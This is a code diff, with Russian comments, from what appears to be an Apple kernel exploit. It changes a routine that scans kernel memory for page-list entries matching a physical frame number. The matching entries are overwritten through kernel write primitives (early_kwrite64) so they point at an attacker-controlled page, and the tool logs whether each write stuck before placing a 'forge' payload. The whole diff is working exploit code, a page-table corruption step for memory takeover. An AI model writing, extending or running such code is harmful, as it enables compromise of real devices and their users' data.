@@ -6290,13 +6290,36 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
                     uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
-                    // 1.9.239: PAGE-LIST в ОБЕИХ упаковках и НАПРАВЛЕНИЯХ — SCAN B
-                    // доказал: список = (4<<32)|pfn и УБЫВАЮЩИЙ (pfn, pfn-1, …) —
-                    // арена аллоцирует физику сверху вниз. Детектор ±-направление.
+                    // 1.9.242: детектор по СИГНАТУРЕ, без серии — page-list в этом
+                    // буте фрагментирован (по 2 записи на страницу), run≥4 мимо.
+                    // Подпись: lo32==pfn32 (наша page-0 запись гарантированно) И
+                    // hi32 ∈ {0,4} (обе упаковки из SCAN B). Совпадение почти
+                    // невозможно случайно (huge count + non-pointer hi). +vtNear.
+                    if ((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4)) {
+                        BOOL vtNear = NO;
+                        for (int d = -2; d <= 2 && !vtNear; d++) {
+                            if (!d) continue;
+                            long oo = (long)o + d * 8;
+                            if (oo < 0 || oo + 8 > (long)sizeof(pbuf2)) continue;
+                            uint64_t nv = kp_untag_ptr(*(uint64_t *)(pbuf2 + oo));
+                            if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
+                        }
+                        if (!vtNear) {
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★ page-0 запись pfn32(hi=%u) @ %#llx+%#x → ctlPFN %#x",
+                                      (uint32_t)(q >> 32), (unsigned long long)kva, o, ctlPFN]);
+                            usleep(1500);
+                            early_kwrite64(kva + o, (q & 0xffffffff00000000ULL) | ctlPFN);
+                            uint64_t rb = early_kread64(kva + o);
+                            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                            hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = 2; nDep++;
+                            continue;
+                        }
+                    }
+                    // 1.9.239: PAGE-LIST серия (если целая) — детектор ±-направление,
+                    // обе упаковки (hi∈{0,4}); патч только page-0 записи серии.
                     {
-                        int dir = 0;   // +1 возрастающая, -1 убывающая
+                        int dir = 0;
                         uint32_t run = 0;
-                        uint64_t mask = q;
                         for (int tryDir = 1; tryDir >= -1 && !run; tryDir -= 2) {
                             uint32_t rr = 0;
                             for (uint32_t r = 0; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
@@ -6310,8 +6333,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         if (run >= 4) {
                             kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (%s) @ %#llx+%#x — патчим page-0 (lo==pfn32) на ctlPFN %#x",
                                       run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o, ctlPFN]);
-                            // 1.9.241: ТОЛЬКО page-0 (lo32==pfn32) — иначе все 32 страницы
-                            // мапятся в ОДНУ ctl и forge-пэйлоад перезапишется хвостами.
                             for (uint32_t ri = 0; ri < run; ri++) {
                                 uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)ri * 8, 8);
                                 if ((uint32_t)qn != pfn32) continue;
